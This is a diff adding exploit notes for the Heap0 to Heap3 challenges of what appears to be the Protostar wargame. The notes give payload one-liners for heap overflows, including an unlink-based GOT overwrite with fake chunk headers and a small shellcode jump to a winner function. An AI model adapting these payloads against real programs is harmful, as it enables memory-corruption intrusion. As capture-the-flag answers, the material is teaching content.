@@ -1,0 +1,32 @@
+(shell : bash)
+
+Heap0
+#simple heap overflow
+./heap0 `python -c 'print "A" * 72 + "\x64\x84\x04\x08"'`
+
+Heap1
+#heap overflow(put_plt = winner_function_add)
+./heap1 `python -c 'print "A" * 20 + "\x74\x97\x04\x08"'` `python -c 'print "\x94\x84\x04\x08"'`
+
+Heap2
+#simple heap overflow
+python heap2ex.py | ./heap2
+
+- heap2ex.py -
+print 'auth ' + 'A' * 4
+print 'service' + 'A' * 28
+print 'login'
+
+Heap3
+Detail Write Up : http://nextline.tistory.com/98 (My Blog)
+
+# a_prev_size(4) + a_size(4) + 0x90(8) + winnershellcode(6) + b_prev_size(4) + b_size(4) + padding(28) + fake_prev_size2(4) + fake_prev_size(4) + fake_size(4) +  dummy(4) + put_got - 12(4) + winnershellcode_add(4) 
+
+1) ./heap3 `python -c 'print "\x90" * 8 + "\x68\x64\x88\x04\x08\xc3" + " " + "A"*28 + "\xff" * 4 + "\xfc\xff\xff\xff"*2 + " " + "CCCC" + "\x1c\xb1\x04\x08" + "\x04\xc0\x04\x08"'`
+
+# a_prev_size(4) + a_size(4) + 0x90(8) + winnershellcode(6) + padding(14) + fake_prev_size2(4) + fake_prev_size(4) + fake_size(4) +  dummy(4) + put_got - 12(4) + winnershellcode_add(4)  + dummy(1)
+
+2) ./heap3 `python -c 'print "\x90" * 8 + "\x68\x64\x88\x04\x08\xc3" + "A" * 14 + "\xff" * 4 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + " " +"aaaa"+ "\x1c\xb1\x04\x08" + "\x04\xc0\x04\x08"'` C
+
+
+
